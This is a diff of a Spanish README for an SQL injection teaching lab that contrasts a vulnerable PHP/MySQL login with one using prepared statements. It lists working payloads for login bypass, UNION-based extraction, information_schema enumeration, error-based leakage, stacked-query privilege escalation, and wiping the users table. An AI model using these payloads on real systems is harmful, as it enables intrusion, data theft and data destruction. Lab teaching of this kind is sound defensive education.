@@ -6,7 +6,7 @@ El proyecto contrasta un escenario altamente vulnerable con un escenario seguro,
 
 ## 🎯 Objetivos del Proyecto
 * **Demostrar** fallos críticos en la seguridad de los SGBD debido a la mala sanitización de entradas.
-* **Ejecutar** escenarios de ataque para exponer datos sensibles, modificar registros y provocar denegación de servicio.
+* **Ejecutar** escenarios de ataque para exponer datos sensibles, mapear estructuras, modificar registros y provocar denegación de servicio.
 * **Implementar** técnicas de prevención y mitigación estructurales (Consultas Parametrizadas / Prepared Statements).
 
 ## 🛠️ Requisitos Previos
@@ -49,19 +49,24 @@ En este entorno, el código PHP utiliza concatenación directa y soporta consult
     * `admin' #`
     * *Impacto:* Evasión del login ingresando al sistema con la cuenta del administrador sin conocer la clave.
 
-* **B. Extracción Visual de Datos (UNION SELECT):**
+* **B. Extracción Visual de Datos (UNION SELECT Básico):**
     * `fantasma' UNION SELECT 1, database(), @@version, 'Administrador' #`
     * *Impacto:* Imprime el nombre de la base de datos y la versión del motor de MySQL directamente en la interfaz gráfica del panel de control.
 
-* **C. Fuga de Información (Error-Based SQLi):**
+* **C. Enumeración de Base de Datos (UNION SELECT Avanzado):**
+    * *Descubrir Tablas:* `fantasma' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 'Administrador' FROM information_schema.tables WHERE table_schema=database() #`
+    * *Descubrir Columnas:* `fantasma' UNION SELECT 1, GROUP_CONCAT(column_name), 3, 'Administrador' FROM information_schema.columns WHERE table_name='usuarios' #`
+    * *Impacto:* Permite mapear la estructura interna de la base de datos consultando el `information_schema`, revelando exactamente dónde está guardada la información crítica.
+
+* **D. Fuga de Información (Error-Based SQLi):**
     * `admin' AND EXTRACTVALUE(1, CONCAT(0x7e, database(), 0x7e, @@version)) #`
-    * *Impacto:* Provoca un colapso en la sintaxis XPATH obligando al SGBD a revelar información sensible en la pantalla de error de PHP.
+    * *Impacto:* Provoca un colapso en la sintaxis XPATH obligando al SGBD a revelar información sensible en la pantalla de error crudo de PHP.
 
-* **D. Escalamiento de Privilegios Vertical (Stacked Queries - UPDATE):**
+* **E. Escalamiento de Privilegios Vertical (Stacked Queries - UPDATE):**
     * `empleado1'; UPDATE usuarios SET rol='Administrador' WHERE username='empleado1'; -- `
-    * *Impacto:* Permite a un usuario estándar alterar la base de datos desde el login para auto-asignarse rol de Administrador.
+    * *Impacto:* Permite a un usuario estándar alterar la base de datos desde el login para auto-asignarse el rol de Administrador.
 
-* **E. Sabotaje / Destrucción (Stacked Queries - DELETE):**
+* **F. Sabotaje / Destrucción (Stacked Queries - DELETE):**
     * `admin'; DELETE FROM usuarios; -- `
     * *Impacto:* Vacía por completo la tabla de la base de datos. *(Nota de Contingencia: Tras ejecutar este ataque, deberás volver a importar el archivo `database.sql` en tu gestor para restaurar el laboratorio).*
 
